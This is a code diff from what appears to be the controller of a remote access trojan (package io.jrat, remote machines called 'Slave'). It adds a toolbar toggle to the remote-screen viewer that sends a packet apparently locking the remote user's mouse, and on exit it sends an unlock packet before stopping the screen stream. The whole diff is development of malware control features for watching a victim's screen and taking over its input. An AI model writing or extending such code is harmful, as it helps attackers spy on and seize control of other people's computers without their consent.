@@ -7,6 +7,7 @@ import io.jrat.controller.ErrorDialog;
 import io.jrat.controller.Slave;
 import io.jrat.controller.packets.outgoing.Packet12RemoteScreen;
 import io.jrat.controller.packets.outgoing.Packet26StopRemoteScreen;
+import io.jrat.controller.packets.outgoing.Packet27ToggleMouseLock;
 import io.jrat.controller.packets.outgoing.Packet91MouseMove;
 import io.jrat.controller.packets.outgoing.Packet92MousePress;
 import io.jrat.controller.packets.outgoing.Packet93MouseRelease;
@@ -35,6 +36,7 @@ import java.util.HashMap;
 import java.util.Map;
 
 import javax.imageio.ImageIO;
+import javax.swing.Action;
 import javax.swing.DefaultComboBoxModel;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
@@ -87,6 +89,7 @@ public class FrameRemoteScreen extends BaseFrame {
 	private JSlider sliderSize;
 	private JLabel lblSize;
 	private JToggleButton tglbtnToggleMouse;
+	private JToggleButton tglbtnToggleMouseLock;
 	private JToggleButton tglbtnToggleKeyboard;
 	private JToggleButton tglbtnToggleMovement;
 	private JComboBox<String> cbMonitors;
@@ -301,6 +304,18 @@ public class FrameRemoteScreen extends BaseFrame {
 		tglbtnToggleMouse.setSelected(true);
 		tglbtnToggleMouse.setIcon(IconUtils.getIcon("mouse"));
 		toolBarTop.add(tglbtnToggleMouse);
+
+		tglbtnToggleMouseLock = new JToggleButton("");
+		tglbtnToggleMouseLock.setIcon(IconUtils.getIcon("mouse_disabled"));
+		tglbtnToggleMouseLock.addActionListener(new ActionListener() {
+			@Override
+			public void actionPerformed(ActionEvent e) {
+				slave.addToSendQueue(new Packet27ToggleMouseLock(tglbtnToggleMouseLock.isSelected()));
+			}
+		});
+		toolBarTop.add(tglbtnToggleMouseLock);
+
+		toolBarTop.addSeparator();
 		
 		tglbtnToggleKeyboard = new JToggleButton("");
 		tglbtnToggleKeyboard.setSelected(true);
@@ -351,7 +366,8 @@ public class FrameRemoteScreen extends BaseFrame {
 	public void exit() {
 		INSTANCES.remove(slave);
 		threadFps.stopRunning();
-		
+
+		slave.addToSendQueue(new Packet27ToggleMouseLock(false));
 		slave.addToSendQueue(new Packet26StopRemoteScreen());
 	}
 	
